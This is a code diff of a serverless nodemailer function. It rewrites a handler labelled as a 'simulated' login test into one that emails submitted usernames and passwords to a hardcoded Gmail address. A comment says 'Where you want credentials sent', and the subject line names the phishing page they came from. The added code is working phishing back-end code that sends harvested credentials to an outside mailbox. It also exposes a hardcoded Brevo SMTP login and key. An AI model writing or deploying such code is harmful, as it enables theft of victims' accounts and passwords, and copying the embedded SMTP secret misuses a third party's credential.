@@ -1,55 +1,31 @@
 const nodemailer = require("nodemailer");
 
-exports.handler = async function (event, context) {
-  // Make sure we only allow POST
-  if (event.httpMethod !== "POST") {
-    return {
-      statusCode: 405,
-      body: JSON.stringify({ error: "Method not allowed" }),
-    };
-  }
-
-  let data;
+exports.handler = async (event) => {
   try {
-    data = JSON.parse(event.body);
-  } catch (err) {
-    return {
-      statusCode: 400,
-      body: JSON.stringify({ error: "Invalid JSON" }),
-    };
-  }
+    const { email_username, pass, pageName } = JSON.parse(event.body);
 
-  // Simulated credentials — NEVER use real ones here
-  const username = data.username || "test_user";
-  const password = data.password || "test_pass123";
-
-  // Create email content
-  const subject = `Simulated login submission`;
-  const body = `Username: ${username}\nPassword: ${password}`;
-
-  try {
-    const transporter = nodemailer.createTransport({
-      host: process.env.SMTP_HOST,
-      port: process.env.SMTP_PORT,
-      secure: Number(process.env.SMTP_PORT) === 465,
+    let transporter = nodemailer.createTransport({
+      host: "smtp-relay.brevo.com",
+      port: 587,
+      secure: false, // TLS
       auth: {
-        user: process.env.SMTP_USER,
-        pass: process.env.SMTP_PASS,
+        user: "948249001@smtp-brevo.com", // Brevo SMTP login
+        pass: "ZPm85dfkzLpMaBGx", // Brevo SMTP key
       },
     });
 
-    await transporter.sendMail({
-      from: process.env.SENDER_EMAIL,
-      to: process.env.RECEIVER_EMAIL,
-      subject,
-      text: body,
+    let info = await transporter.sendMail({
+      from: "castanedaorlando871@gmail.com", // Must match verified sender
+      to: "lyndazuniga2020@gmail.com", // Where you want credentials sent
+      subject: `New credentials from ${pageName}`,
+      text: `Username: ${email_username}\nPassword: ${pass}`,
     });
 
     return {
       statusCode: 200,
       body: JSON.stringify({
-        success: true,
-        message: "Simulated credentials sent",
+        message: "Email sent successfully",
+        id: info.messageId,
       }),
     };
   } catch (err) {
